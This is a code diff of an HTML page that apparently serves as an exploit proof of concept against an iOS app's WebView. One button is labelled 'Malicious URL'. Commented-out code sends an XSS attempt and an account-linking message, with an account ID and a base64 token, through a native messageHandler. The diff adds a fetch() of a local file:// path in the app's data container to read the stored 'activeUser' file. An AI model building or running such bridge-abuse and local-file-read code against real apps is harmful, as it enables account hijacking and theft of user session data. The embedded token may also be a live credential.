@@ -37,19 +37,24 @@
   <button onclick="sendPinmarkletCompletion()">📌 pinmarkletCompletionHandler (Malicious URL)</button>
 
   <script>
-    // function sendTargetAccountLinking() {
-    //   try {
-    //     // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
-    //     window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
-    //     accountId: "863776540939551628",
-    //     action: "accountLinked",
-    //     token: "MTQzMTU5NDo4MTMzOTI1MjAxMDgxNzE2NzA6OTIyMzM3MjAzNjg1NDc3NTgwNzoxfDE3NTM2NzEzMjE6MC0tMjg0YmE0ZDE5Yjc2YjdlY2ViODAyYTc4ODc5NDNkMTg="
-    //     });
-    //     alert("✅ Sent XSS ");
-    //   } catch (e) {
-    //     alert("❌ Error: " + e.message);
-    //   }
-    // }
+    function sendTargetAccountLinking() {
+      try {
+        // // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
+        // window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
+        // accountId: "863776540939551628",
+        // action: "accountLinked",
+        // token: "MTQzMTU5NDo4MTMzOTI1MjAxMDgxNzE2NzA6OTIyMzM3MjAzNjg1NDc3NTgwNzoxfDE3NTM2NzEzMjE6MC0tMjg0YmE0ZDE5Yjc2YjdlY2ViODAyYTc4ODc5NDNkMTg="
+        // });
+        // alert("✅ Sent XSS ");
+
+        fetch('file:///var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/Documents/activeUser')
+        .then(response => response.text())
+        .then(text => console.log(text))
+        .catch(err => console.error(err));
+      } catch (e) {
+        alert("❌ Error: " + e.message);
+      }
+    }
 
     // function sendAmazonShop() {
     //   try {
@@ -88,10 +93,7 @@
     //   }
     // }
 
-    fetch('file:///var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/Documents/activeUser')
-  .then(response => response.text())
-  .then(text => console.log(text))
-  .catch(err => console.error(err));
+    
 
   </script>
 
